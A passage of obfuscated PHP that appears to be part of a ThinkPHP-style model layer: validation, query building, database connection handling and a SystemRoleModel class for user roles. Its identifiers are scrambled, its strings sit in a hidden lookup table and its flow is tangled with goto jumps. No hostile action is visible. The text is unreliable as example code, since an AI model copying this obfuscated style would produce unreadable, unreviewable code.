!$this->options[$AöÀ‰ç×†ï[289]]) { return !0; } if (think_config($AöÀ‰ç×†ï[286])) { $d˜ƒ‚ŸøÀ = think_config($AöÀ‰ç×†ï[287]); if (!isset($B“Êª“áŠÁ[$d˜ƒ‚ŸøÀ]) || Session::get($d˜ƒ‚ŸøÀ)) { return !1; } list($eøÏ×ŸÊ†, $BåèÍ’ô) = explode($AöÀ‰ç×†ï[70], $B“Êª“áŠÁ[$d˜ƒ‚ŸøÀ]); if ($BåèÍ’ô && Session::get($d˜ƒ‚ŸøÀ . $AöÀ‰ç×†ï[91] . $eøÏ×ŸÊ†) === $BåèÍ’ô) { Session::remove($d˜ƒ‚ŸøÀ . $AöÀ‰ç×†ï[91] . $eøÏ×ŸÊ†); return !0; } if (think_config($AöÀ‰ç×†ï[290])) { Session::remove($d˜ƒ‚ŸøÀ . $AöÀ‰ç×†ï[91] . $eøÏ×ŸÊ†); } return !1; } return !0; } public function regex($DÚÈõƒ‘®, $f½÷§×ß°™) { $A¿º–êç—± =& $_SERVER[¼€¼ˆ¦‚¡]; $d¿ÅèöÍÇ† = array($A¿º–êç—±[291] => $A¿º–êç—±[292], $A¿º–êç—±[293] => $A¿º–êç—±[294], $A¿º–êç—±[295] => $A¿º–êç—±[296], $A¿º–êç—±[297] => $A¿º–êç—±[298], $A¿º–êç—±[299] => $A¿º–êç—±[300], $A¿º–êç—±[301] => $A¿º–êç—±[302], $A¿º–êç—±[303] => $A¿º–êç—±[304], $A¿º–êç—±[278] => $A¿º–êç—±[305], $A¿º–êç—±[306] => $A¿º–êç—±[307]); if (isset($d¿ÅèöÍÇ†[strtolower($f½÷§×ß°™)])) { $f½÷§×ß°™ = $d¿ÅèöÍÇ†[strtolower($f½÷§×ß°™)]; } return preg_match($f½÷§×ß°™, $DÚÈõƒ‘®) === 1; } private function autoOperation(&$D‡Ù‚„•Ò„, $bÛÜŠ‘®Å·) { $Eööóšœ‚Ó =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($this->options[$Eööóšœ‚Ó[308]])) { $E­‰”†æö = $this->options[$Eööóšœ‚Ó[308]]; unset($this->options[$Eööóšœ‚Ó[308]]); } elseif (!empty($this->_auto)) { $E­‰”†æö = $this->_auto; } if (isset($E­‰”†æö)) { foreach ($E­‰”†æö as $Dçé×©èÚ) { if (empty($Dçé×©èÚ[2])) { $Dçé×©èÚ[2] = THINK_MODEL_INSERT; } if ($bÛÜŠ‘®Å· == $Dçé×©èÚ[2] || $Dçé×©èÚ[2] == THINK_MODEL_BOTH) { switch (trim($Dçé×©èÚ[3])) { case $Eööóšœ‚Ó[309]: case $Eööóšœ‚Ó[310]: $aÌ°§ªíŒ‡ = isset($Dçé×©èÚ[4]) ? (array) $Dçé×©èÚ[4] : array(); if (isset($D‡Ù‚„•Ò„[$Dçé×©èÚ[0]])) { array_unshift($aÌ°§ªíŒ‡, $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]]); } if ($Eööóšœ‚Ó[309] == $Dçé×©èÚ[3]) { $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]] = call_user_func_array($Dçé×©èÚ[1], $aÌ°§ªíŒ‡); } else { $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]] = call_user_func_array(array(&$this, $Dçé×©èÚ[1]), $aÌ°§ªíŒ‡); } break; case $Eööóšœ‚Ó[261]: $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]] = $D‡Ù‚„•Ò„[$Dçé×©èÚ[1]]; break; case $Eööóšœ‚Ó[311]: if ($Eööóšœ‚Ó[33] === $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]]) { unset($D‡Ù‚„•Ò„[$Dçé×©èÚ[0]]); } break; case $Eööóšœ‚Ó[312]: default: $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]] = $Dçé×©èÚ[1]; } if (!1 === $D‡Ù‚„•Ò„[$Dçé×©èÚ[0]]) { unset($D‡Ù‚„•Ò„[$Dçé×©èÚ[0]]); } } } } return $D‡Ù‚„•Ò„; } protected function autoValidation($F‰‰“ˆ¤µ›, $d…¡ŒĞ…ä‹) { $aÓ°êÀ ê =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($this->options[$aÓ°êÀ ê[313]])) { $E’ÇõÖ³ŸÔ = $this->options[$aÓ°êÀ ê[313]]; unset($this->options[$aÓ°êÀ ê[313]]); } elseif (!empty($this->_validate)) { $E’ÇõÖ³ŸÔ = $this->_validate; } if (isset($E’ÇõÖ³ŸÔ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($E’ÇõÖ³ŸÔ as $d™ŒÃÓ¯ª => $f’ÈøÏ´ƒ…) { if (empty($f’ÈøÏ´ƒ…[5]) || $f’ÈøÏ´ƒ…[5] == THINK_MODEL_BOTH || $f’ÈøÏ´ƒ…[5] == $d…¡ŒĞ…ä‹) { if (0 == strpos($f’ÈøÏ´ƒ…[2], $aÓ°êÀ ê[314]) && strpos($f’ÈøÏ´ƒ…[2], $aÓ°êÀ ê[315])) { $f’ÈøÏ´ƒ…[2] = think_lang(substr($f’ÈøÏ´ƒ…[2], 2, -1)); } $f’ÈøÏ´ƒ…[3] = isset($f’ÈøÏ´ƒ…[3]) ? $f’ÈøÏ´ƒ…[3] : THINK_EXISTS_VALIDATE; $f’ÈøÏ´ƒ…[4] = isset($f’ÈøÏ´ƒ…[4]) ? $f’ÈøÏ´ƒ…[4] : $aÓ°êÀ ê[316]; switch ($f’ÈøÏ´ƒ…[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($F‰‰“ˆ¤µ›, $f’ÈøÏ´ƒ…)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aÓ°êÀ ê[33] != trim($F‰‰“ˆ¤µ›[$f’ÈøÏ´ƒ…[0]])) { if (!1 === $this->_validationField($F‰‰“ˆ¤µ›, $f’ÈøÏ´ƒ…)) { return !1; } } break; default: if (isset($F‰‰“ˆ¤µ›[$f’ÈøÏ´ƒ…[0]])) { if (!1 === $this->_validationField($F‰‰“ˆ¤µ›, $f’ÈøÏ´ƒ…)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($F÷â¨—ò, $dÂæˆâ™¢) { if (!1 === $this->_validationFieldItem($F÷â¨—ò, $dÂæˆâ™¢)) { if ($this->patchValidate) { $this->error[$dÂæˆâ™¢[0]] = $dÂæˆâ™¢[2]; } else { $this->error = $dÂæˆâ™¢[2]; return !1; } } return; } protected function _validationFieldItem($DªÛ®Áá¥, $d…åÑô¥­´) { $e™Ú…¨¹Á =& $_SERVER[¼€¼ˆ¦‚¡]; switch (strtolower(trim($d…åÑô¥­´[4]))) { case $e™Ú…¨¹Á[309]: case $e™Ú…¨¹Á[310]: $Cšê™ÔƒÓÃ = isset($d…åÑô¥­´[6]) ? (array) $d…åÑô¥­´[6] : array(); if (is_string($d…åÑô¥­´[0]) && strpos($d…åÑô¥­´[0], $e™Ú…¨¹Á[47])) { $d…åÑô¥­´[0] = explode($e™Ú…¨¹Á[47], $d…åÑô¥­´[0]); } if (is_array($d…åÑô¥­´[0])) { foreach ($d…åÑô¥­´[0] as $AÆƒ¾ŸŞåË) { $dÕº¼Û [$AÆƒ¾ŸŞåË] = $DªÛ®Áá¥[$AÆƒ¾ŸŞåË]; } array_unshift($Cšê™ÔƒÓÃ, $dÕº¼Û ); } else { array_unshift($Cšê™ÔƒÓÃ, $DªÛ®Áá¥[$d…åÑô¥­´[0]]); } if ($e™Ú…¨¹Á[309] == $d…åÑô¥­´[4]) { return call_user_func_array($d…åÑô¥­´[1], $Cšê™ÔƒÓÃ); } else { return call_user_func_array(array(&$this, $d…åÑô¥­´[1]), $Cšê™ÔƒÓÃ); } case $e™Ú…¨¹Á[317]: return $DªÛ®Áá¥[$d…åÑô¥­´[0]] == $DªÛ®Áá¥[$d…åÑô¥­´[1]]; case $e™Ú…¨¹Á[318]: if (is_string($d…åÑô¥­´[0]) && strpos($d…åÑô¥­´[0], $e™Ú…¨¹Á[47])) { $d…åÑô¥­´[0] = explode($e™Ú…¨¹Á[47], $d…åÑô¥­´[0]); } $bÖº„¨¨Œ = array(); if (is_array($d…åÑô¥­´[0])) { foreach ($d…åÑô¥­´[0] as $AÆƒ¾ŸŞåË) { $bÖº„¨¨Œ[$AÆƒ¾ŸŞåË] = $DªÛ®Áá¥[$AÆƒ¾ŸŞåË]; } } else { $bÖº„¨¨Œ[$d…åÑô¥­´[0]] = $DªÛ®Áá¥[$d…åÑô¥­´[0]]; } if (!empty($DªÛ®Áá¥[$this->getPk()])) { $bÖº„¨¨Œ[$this->getPk()] = array($e™Ú…¨¹Á[319], $DªÛ®Áá¥[$this->getPk()]); } if ($this->where($bÖº„¨¨Œ)->find()) { return !1; } return !0; default: return $this->check($DªÛ®Áá¥[$d…åÑô¥­´[0]], $d…åÑô¥­´[1], $d…åÑô¥­´[4]); } } public function check($fÍÒÁç¯Õè, $FÇà«¥ËÎ, $AÚµğİ—ˆ = "\x72\x65\x67\x65\x78") { $EéÑå‹¥®¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $AÚµğİ—ˆ = strtolower(trim($AÚµğİ—ˆ)); switch ($AÚµğİ—ˆ) { case $EéÑå‹¥®¡[7]: case $EéÑå‹¥®¡[320]: $a„ÈÌŠÕŠø = is_array($FÇà«¥ËÎ) ? $FÇà«¥ËÎ : explode($EéÑå‹¥®¡[47], $FÇà«¥ËÎ); return $AÚµğİ—ˆ == $EéÑå‹¥®¡[7] ? in_array($fÍÒÁç¯Õè, $a„ÈÌŠÕŠø) : !in_array($fÍÒÁç¯Õè, $a„ÈÌŠÕŠø); case $EéÑå‹¥®¡[321]: case $EéÑå‹¥®¡[322]: if (is_array($FÇà«¥ËÎ)) { $F°™Ò°©“ñ = $FÇà«¥ËÎ[0]; $dŠÙæÓÏ÷Õ = $FÇà«¥ËÎ[1]; } else { list($F°™Ò°©“ñ, $dŠÙæÓÏ÷Õ) = explode($EéÑå‹¥®¡[47], $FÇà«¥ËÎ); } return $AÚµğİ—ˆ == $EéÑå‹¥®¡[321] ? $fÍÒÁç¯Õè >= $F°™Ò°©“ñ && $fÍÒÁç¯Õè <= $dŠÙæÓÏ÷Õ : $fÍÒÁç¯Õè < $F°™Ò°©“ñ || $fÍÒÁç¯Õè > $dŠÙæÓÏ÷Õ; case $EéÑå‹¥®¡[323]: case $EéÑå‹¥®¡[324]: return $AÚµğİ—ˆ == $EéÑå‹¥®¡[323] ? $fÍÒÁç¯Õè == $FÇà«¥ËÎ : $fÍÒÁç¯Õè != $FÇà«¥ËÎ; case $EéÑå‹¥®¡[325]: $F¡ƒ±ÚëÀ = mb_strlen($fÍÒÁç¯Õè, $EéÑå‹¥®¡[326]); if (strpos($FÇà«¥ËÎ, $EéÑå‹¥®¡[47])) { list($F°™Ò°©“ñ, $dŠÙæÓÏ÷Õ) = explode($EéÑå‹¥®¡[47], $FÇà«¥ËÎ); return $F¡ƒ±ÚëÀ >= $F°™Ò°©“ñ && $F¡ƒ±ÚëÀ <= $dŠÙæÓÏ÷Õ; } else { return $F¡ƒ±ÚëÀ == $FÇà«¥ËÎ; } case $EéÑå‹¥®¡[327]: list($A ´ Æ„è, $BîŠĞ´ö¡Ü) = explode($EéÑå‹¥®¡[47], $FÇà«¥ËÎ); if (!is_numeric($A ´ Æ„è)) { $A ´ Æ„è = strtotime($A ´ Æ„è); } if (!is_numeric($BîŠĞ´ö¡Ü)) { $BîŠĞ´ö¡Ü = strtotime($BîŠĞ´ö¡Ü); } return NOW_TIME >= $A ´ Æ„è && NOW_TIME <= $BîŠĞ´ö¡Ü; case $EéÑå‹¥®¡[328]: return in_array(get_client_ip(), explode($EéÑå‹¥®¡[47], $FÇà«¥ËÎ)); case $EéÑå‹¥®¡[329]: return !in_array(get_client_ip(), explode($EéÑå‹¥®¡[47], $FÇà«¥ËÎ)); case $EéÑå‹¥®¡[316]: default: return $this->regex($fÍÒÁç¯Õè, $FÇà«¥ËÎ); } } public function query($e«ó—¾ª†Æ, $b«ƒ‚ˆ«Ëà = false) { $fÆàŠ–ãœ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!is_bool($b«ƒ‚ˆ«Ëà) && !is_array($b«ƒ‚ˆ«Ëà)) { $b«ƒ‚ˆ«Ëà = func_get_args(); array_shift($b«ƒ‚ˆ«Ëà); } $e«ó—¾ª†Æ = str_replace(array($fÆàŠ–ãœ[217], $fÆàŠ–ãœ[330]), $fÆàŠ–ãœ[50], $e«ó—¾ª†Æ); $e«ó—¾ª†Æ = $this->parseSql($e«ó—¾ª†Æ, $b«ƒ‚ˆ«Ëà); return $this->db->query($e«ó—¾ª†Æ); } public function execute($eå§©ßÓİø, $a¯¶‰ÈË²¦ = false) { if (!is_bool($a¯¶‰ÈË²¦) && !is_array($a¯¶‰ÈË²¦)) { $a¯¶‰ÈË²¦ = func_get_args(); array_shift($a¯¶‰ÈË²¦); } $eå§©ßÓİø = $this->parseSql($eå§©ßÓİø, $a¯¶‰ÈË²¦); return $this->db->execute($eå§©ßÓİø); } protected function parseSql($e‹·éÂÍõë, $DÚšíäÏÆ°) { $FÇà¶¤šŠ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!0 === $DÚšíäÏÆ°) { $b‹‡·çœ’” = $this->_parseOptions(); $e‹·éÂÍõë = $this->db->parseSql($e‹·éÂÍõë, $b‹‡·çœ’”); } elseif (is_array($DÚšíäÏÆ°)) { $DÚšíäÏÆ° = array_map(array($this->db, $FÇà¶¤šŠ[331]), $DÚšíäÏÆ°); $e‹·éÂÍõë = vsprintf($e‹·éÂÍõë, $DÚšíäÏÆ°); } else { $e‹·éÂÍõë = strtr($e‹·éÂÍõë, array($FÇà¶¤šŠ[332] => $this->getTableName(), $FÇà¶¤šŠ[333] => think_config($FÇà¶¤šŠ[232]))); } $this->db->setModel($this->name); return $e‹·éÂÍõë; } public function db($dÀ‡¸ç¬·¶ = '', $béßÍáæ„ = '', $aĞ¡¯â¹¯“ = array()) { goto E®¨æÇ¥Ÿ; E®¨æÇ¥Ÿ: $f¨É¦İ‘ä =& $_SERVER[¼€¼ˆ¦‚¡]; if ($f¨É¦İ‘ä[33] === $dÀ‡¸ç¬·¶ && $this->db) { return $this->db; } static $b…¥òÑò = array(); goto bª°Ù¾ï‡; Bë»ÖÜÉİ: $b…¥òÑò[$dÀ‡¸ç¬·¶] = $béßÍáæ„; $this->db = $DŸßÛƒ™é‹[$dÀ‡¸ç¬·¶]; $this->_after_db(); goto bğ‚¶µğê©; bğ‚¶µğê©: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A™Å™­ƒ›‹; bª°Ù¾ï‡: static $DŸßÛƒ™é‹ = array(); if (!isset($DŸßÛƒ™é‹[$dÀ‡¸ç¬·¶]) || isset($DŸßÛƒ™é‹[$dÀ‡¸ç¬·¶]) && $béßÍáæ„ && $b…¥òÑò[$dÀ‡¸ç¬·¶] != $béßÍáæ„) { if (!empty($béßÍáæ„) && is_string($béßÍáæ„) && !1 === strpos($béßÍáæ„, $f¨É¦İ‘ä[8])) { $béßÍáæ„ = think_config($béßÍáæ„); } $DŸßÛƒ™é‹[$dÀ‡¸ç¬·¶] = Db::getInstance($béßÍáæ„); } elseif (NULL === $béßÍáæ„) { $DŸßÛƒ™é‹[$dÀ‡¸ç¬·¶]->close(); unset($DŸßÛƒ™é‹[$dÀ‡¸ç¬·¶]); return; } if (!empty($aĞ¡¯â¹¯“)) { if (is_string($aĞ¡¯â¹¯“)) { parse_str($aĞ¡¯â¹¯“, $aĞ¡¯â¹¯“); } foreach ($aĞ¡¯â¹¯“ as $C«¼öÅÜ…ñ => $aîÜƒÊßç) { $this->setProperty($C«¼öÅÜ…ñ, $aîÜƒÊßç); } } goto Bë»ÖÜÉİ; A™Å™­ƒ›‹: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $B³ôÂ¯†‚â = get_class($this); if ($B³ôÂ¯†‚â == $_SERVER[¼€¼ˆ¦‚¡][334]) { return $this->name; } $this->name = substr($B³ôÂ¯†‚â, 0, -5); } return $this->name; } public function getTableName() { $aÖ®ˆ‹”Îò =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($this->trueTableName)) { $B¹µÃåŒùÛ = !empty($this->tablePrefix) ? $this->tablePrefix : $aÖ®ˆ‹”Îò[33]; if (!empty($this->tableName)) { $B¹µÃåŒùÛ .= $this->tableName; } else { $B¹µÃåŒùÛ .= think_parse_name($this->name); } $this->trueTableName = strtolower($B¹µÃåŒùÛ); } return (!empty($this->dbName) ? $this->dbName . $aÖ®ˆ‹”Îò[91] : $aÖ®ˆ‹”Îò[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $EäßÁÄÛÂ =& $_SERVER[¼€¼ˆ¦‚¡]; return isset($this->fields[$EäßÁÄÛÂ[239]]) ? $this->fields[$EäßÁÄÛÂ[239]] : $this->pk; } public function getDbFields() { $AÊš‚ß›·à =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($this->options[$AÊš‚ß›·à[267]])) { $Bæ·íŒÔ†… = $this->db->getFields($this->options[$AÊš‚ß›·à[267]]); return $Bæ·íŒÔ†… ? array_keys($Bæ·íŒÔ†…) : !1; } if ($this->fields) { $Bæ·íŒÔ†… = $this->fields; unset($Bæ·íŒÔ†…[$AÊš‚ß›·à[238]], $Bæ·íŒÔ†…[$AÊš‚ß›·à[239]], $Bæ·íŒÔ†…[$AÊš‚ß›·à[240]], $Bæ·íŒÔ†…[$AÊš‚ß›·à[237]]); return $Bæ·íŒÔ†…; } return !1; } public function data($Fä™„†¥‡ì = '') { $eÖÆÂÂÖºÊ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($eÖÆÂÂÖºÊ[33] === $Fä™„†¥‡ì && !empty($this->data)) { return $this->data; } if (is_object($Fä™„†¥‡ì)) { $Fä™„†¥‡ì = get_object_vars($Fä™„†¥‡ì); } elseif (is_string($Fä™„†¥‡ì)) { parse_str($Fä™„†¥‡ì, $Fä™„†¥‡ì); } elseif (!is_array($Fä™„†¥‡ì)) { think_exception(think_lang($eÖÆÂÂÖºÊ[259])); } $this->data = $Fä™„†¥‡ì; return $this; } public function join($c¶Å‹Éï) { $d¥£«¡³ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_array($c¶Å‹Éï)) { $this->options[$d¥£«¡³[270]] = $c¶Å‹Éï; } elseif (!empty($c¶Å‹Éï)) { $this->options[$d¥£«¡³[270]][] = $c¶Å‹Éï; } return $this; } public function union($d¶‘‘Ç¶, $cø…¦ä…— = false) { goto FÆ¦ß†Ô ; FÆ¦ß†Ô : $c¨ß“—²½“ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($d¶‘‘Ç¶)) { return $this; } if ($cø…¦ä…—) { $this->options[$c¨ß“—²½“[335]][$c¨ß“—²½“[336]] = !0; } goto cÃâ”êá´; cÃâ”êá´: if (is_object($d¶‘‘Ç¶)) { $d¶‘‘Ç¶ = get_object_vars($d¶‘‘Ç¶); } if (is_string($d¶‘‘Ç¶)) { $C©Š²ïŸÊ = $d¶‘‘Ç¶; } elseif (is_array($d¶‘‘Ç¶)) { if (isset($d¶‘‘Ç¶[0])) { $this->options[$c¨ß“—²½“[335]] = array_merge($this->options[$c¨ß“—²½“[335]], $d¶‘‘Ç¶); return $this; } else { $C©Š²ïŸÊ = $d¶‘‘Ç¶; } } else { think_exception(think_lang($c¨ß“—²½“[259])); } $this->options[$c¨ß“—²½“[335]][] = $C©Š²ïŸÊ; goto Dç‘œõç÷ô; Dç‘œõç÷ô: return $this; goto cÍ¢Á§·ğÎ; cÍ¢Á§·ğÎ: } public function cache($CàÂ÷Ğ­Ö¦ = true, $bêÑÇÀ–â– = null, $Aé»ÖÛ¯Í = '') { $F–¾Ãõá³² =& $_SERVER[¼€¼ˆ¦‚¡]; if (!1 !== $CàÂ÷Ğ­Ö¦) { $this->options[$F–¾Ãõá³²[337]] = array($F–¾Ãõá³²[89] => $CàÂ÷Ğ­Ö¦, $F–¾Ãõá³²[327] => $bêÑÇÀ–â–, $F–¾Ãõá³²[29] => $Aé»ÖÛ¯Í); } return $this; } public function field($AÀèñŞ¸í, $D¶¾ëİ©Šİ = false) { $fÂô…Î´³¶ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!0 === $AÀèñŞ¸í) { $F ŠùÓã›Î = $this->getDbFields(); $AÀèñŞ¸í = $F ŠùÓã›Î ? $F ŠùÓã›Î : $fÂô…Î´³¶[176]; } elseif ($D¶¾ëİ©Šİ) { if (is_string($AÀèñŞ¸í)) { $AÀèñŞ¸í = explode($fÂô…Î´³¶[47], $AÀèñŞ¸í); } $F ŠùÓã›Î = $this->getDbFields(); $AÀèñŞ¸í = $F ŠùÓã›Î ? array_diff($F ŠùÓã›Î, $AÀèñŞ¸í) : $AÀèñŞ¸í; } $this->options[$fÂô…Î´³¶[261]] = $AÀèñŞ¸í; return $this; } public function scope($AÏ§¨óíÈ = '', $fÉê½ìµÆæ = NULL) { $d£Æ¹ºÊ›˜ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($d£Æ¹ºÊ›˜[33] === $AÏ§¨óíÈ) { if (isset($this->_scope[$d£Æ¹ºÊ›˜[34]])) { $cºõæ†çæ = $this->_scope[$d£Æ¹ºÊ›˜[34]]; } else { return $this; } } elseif (is_string($AÏ§¨óíÈ)) { $d½İ÷±ùÍ¬ = explode($d£Æ¹ºÊ›˜[47], $AÏ§¨óíÈ); $cºõæ†çæ = array(); foreach ($d½İ÷±ùÍ¬ as $dšíâÈº­·) { if (!isset($this->_scope[$dšíâÈº­·])) { continue; } $cºõæ†çæ = array_merge($cºõæ†çæ, $this->_scope[$dšíâÈº­·]); } if (!empty($fÉê½ìµÆæ) && is_array($fÉê½ìµÆæ)) { $cºõæ†çæ = array_merge($cºõæ†çæ, $fÉê½ìµÆæ); } } elseif (is_array($AÏ§¨óíÈ)) { $cºõæ†çæ = $AÏ§¨óíÈ; } if (is_array($cºõæ†çæ) && !empty($cºõæ†çæ)) { $this->options = array_merge($this->options, array_change_key_case($cºõæ†çæ)); } return $this; } public function where($dñ×çßĞ©, $eÅ«á·¼ª· = null) { $AÙ»ââ·Ü =& $_SERVER[¼€¼ˆ¦‚¡]; if (!is_null($eÅ«á·¼ª·) && is_string($dñ×çßĞ©)) { if (!is_array($eÅ«á·¼ª·)) { $eÅ«á·¼ª· = func_get_args(); array_shift($eÅ«á·¼ª·); } $eÅ«á·¼ª· = array_map(array($this->db, $AÙ»ââ·Ü[331]), $eÅ«á·¼ª·); $dñ×çßĞ© = vsprintf($dñ×çßĞ©, $eÅ«á·¼ª·); } elseif (is_object($dñ×çßĞ©)) { $dñ×çßĞ© = get_object_vars($dñ×çßĞ©); } elseif (is_array($dñ×çßĞ©)) { foreach ($dñ×çßĞ© as $d‰•×Ş¸²— => $fÒÀ©ÅÀã‘) { if ((is_numeric($d‰•×Ş¸²—) || !$d‰•×Ş¸²—) && is_string($fÒÀ©ÅÀã‘)) { think_trace($AÙ»ââ·Ü[338], $AÙ»ââ·Ü[33], $AÙ»ââ·Ü[46]); die; } } } if (is_string($dñ×çßĞ©) && $AÙ»ââ·Ü[33] != $dñ×çßĞ©) { $dÅ× Ô…êõ = array(); $dÅ× Ô…êõ[$AÙ»ââ·Ü[339]] = $dñ×çßĞ©; $dñ×çßĞ© = $dÅ× Ô…êõ; } if (isset($this->options[$AÙ»ââ·Ü[263]])) { $this->options[$AÙ»ââ·Ü[263]] = array_merge($this->options[$AÙ»ââ·Ü[263]], $dñ×çßĞ©); } else { $this->options[$AÙ»ââ·Ü[263]] = $dñ×çßĞ©; } return $this; } public function limit($d©˜ò”ĞŒğ, $e¨¯º÷±‘Ë = null) { $C³²‹…ô…« =& $_SERVER[¼€¼ˆ¦‚¡]; $this->options[$C³²‹…ô…«[280]] = is_null($e¨¯º÷±‘Ë) ? $d©˜ò”ĞŒğ : $d©˜ò”ĞŒğ . $C³²‹…ô…«[47] . $e¨¯º÷±‘Ë; return $this; } public function page($BªÃÃáƒ, $bÁÏ‹ççá° = null) { $eì¾¥ˆí†å =& $_SERVER[¼€¼ˆ¦‚¡]; $this->options[$eì¾¥ˆí†å[340]] = is_null($bÁÏ‹ççá°) ? $BªÃÃáƒ : $BªÃÃáƒ . $eì¾¥ˆí†å[47] . $bÁÏ‹ççá°; return $this; } public function comment($b¤ÏìÀ¬¼×) { $this->options[$_SERVER[¼€¼ˆ¦‚¡][341]] = $b¤ÏìÀ¬¼×; return $this; } public function setProperty($dùÜÊ¡´Â, $A¾œœ˜ƒ†) { if (property_exists($this, $dùÜÊ¡´Â)) { $this->{$dùÜÊ¡´Â} = $A¾œœ˜ƒ†; } return $this; } } goto A÷¸ŸªÂéª; AÅ¹Œ¼¶£ó: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\162\x6f\154\145\114\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\150", "\x6c\x61\142\145\x6c", "\x64\151\x73\x70\154\141\x79", "\163\x79\x73\x74\x65\x6d", "\x64\145\163\x63", "\x69\147\156\x6f\162\145\105\170\164", "\x69\147\156\x6f\162\x65\x46\x69\x6c\145\x53\151\172\x65", "\x61\144\155\x69\156\151\163\x74\x72\141\x74\x6f\x72", "\163\x6f\162\164"); public function listData($d‰ò”à×Ê¼ = false, $Cğ“Ûã„£Ì = "\x73\x6f\162\x74", $eˆŠÎ„‚‚Ş = false) { $B§º¹£‹ˆ² =& $_SERVER[¼€¼ˆ¦‚¡]; $f‡æÚõƒÎæ = parent::listData($d‰ò”à×Ê¼, $Cğ“Ûã„£Ì, $eˆŠÎ„‚‚Ş); if (!$d‰ò”à×Ê¼) { $A…¿´Ú ÷ = $B§º¹£‹ˆ²[2485]; foreach ($f‡æÚõƒÎæ as $a‘•´µæŞ => $fé¸·¶Í·Ğ) { if ($fé¸·¶Í·Ğ[$B§º¹£‹ˆ²[2486]] == 1) { $f‡æÚõƒÎæ[$a‘•´µæŞ][$B§º¹£‹ˆ²[405]] = $A…¿´Ú ÷; } } } return $f‡æÚõƒÎæ; } public function update($F‘ÜÃœ»ß‰, $AñÎ™ÈÊ­¹) { goto f§ÖÊ‚²¬; a°È¬¶ë¾: if (!$CˆˆÚÚ—£Õ || $b¯Ãßõ°‘Ó && $b¯Ãßõ°‘Ó[$c‘Î’·Ñ³è[367]] != $CˆˆÚÚ—£Õ[$c‘Î’·Ñ³è[367]]) { return !1; } if ($b¯Ãßõ°‘Ó[$c‘Î’·Ñ³è[2486]] == 1) { $AñÎ™ÈÊ­¹ = array($c‘Î’·Ñ³è[28] => $AñÎ™ÈÊ­¹[$c‘Î’·Ñ³è[28]], $c‘Î’·Ñ³è[2123] => $AñÎ™ÈÊ­¹[$c‘Î’·Ñ³è[2123]]); } $this->filterAuth($AñÎ™ÈÊ­¹[$c‘Î’·Ñ³è[376]]); goto D°˜ìæ–èò; f§ÖÊ‚²¬: $c‘Î’·Ñ³è =& $_SERVER[¼€¼ˆ¦‚¡]; $CˆˆÚÚ—£Õ = parent::listData($F‘ÜÃœ»ß‰); $b¯Ãßõ°‘Ó = $this->findByName($AñÎ™ÈÊ­¹[$c‘Î’·Ñ³è[28]]); goto a°È¬¶ë¾; D°˜ìæ–èò: return parent::update($F‘ÜÃœ»ß‰, $AñÎ™ÈÊ­¹); goto dºò¥é—µ­; dºò¥é—µ­: } public function remove($c¾á¯¤³ñ) { $A¤å×“Ù¦ = parent::listData($c¾á¯¤³ñ); if (!$A¤å×“Ù¦ || $A¤å×“Ù¦[$_SERVER[¼€¼ˆ¦‚¡][1080]]) { return !1; } return parent::remove($c¾á¯¤³ñ); } public function add($dğîšà†ƒ¨) { goto c¤”‡¥š—è; f³˜­¬ùëø: $f³Ì¢„ì°Œ = array($A¹È¼Ñ³Å¬[386] => $e·£ì±ãÉ¾, $A¹È¼Ñ³Å¬[2111] => $A¹È¼Ñ³Å¬[33], $A¹È¼Ñ³Å¬[2107] => $A¹È¼Ñ³Å¬[2124], $A¹È¼Ñ³Å¬[2487] => 1, $A¹È¼Ñ³Å¬[2110] => 0, $A¹È¼Ñ³Å¬[2488] => 0, $A¹È¼Ñ³Å¬[2109] => $this->getSort()); $dğîšà†ƒ¨ = array_merge($f³Ì¢„ì°Œ, $dğîšà†ƒ¨); $this->filterAuth($dğîšà†ƒ¨[$A¹È¼Ñ³Å¬[376]]); goto eƒÇ‚…‰É; c¤”‡¥š—è: $A¹È¼Ñ³Å¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $e·£ì±ãÉ¾ = $dğîšà†ƒ¨[$A¹È¼Ñ³Å¬[28]]; if ($this->findByName($e·£ì±ãÉ¾)) { return !1; } goto f³˜­¬ùëø; eƒÇ‚…‰É: return parent::insert($dğîšà†ƒ¨); goto c—È»¿õÜÑ; c—È»¿õÜÑ: } private function getSort() { $FšË›İÜ¸¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÂÂ¹ÇÈ®İ = parent::listData(); $E¾¥Ş½ÕŸ = array_to_keyvalue($bÂÂ¹ÇÈ®İ, $FšË›İÜ¸¯[33], $FšË›İÜ¸¯[2126]); return empty($E¾¥Ş½ÕŸ) ? 0 : max($E¾¥Ş½ÕŸ) + 1; } private function filterAuth(&$Dİî®øÖñ) { $B…§Æ˜“ê =& $_SERVER[¼€¼ˆ¦‚¡]; 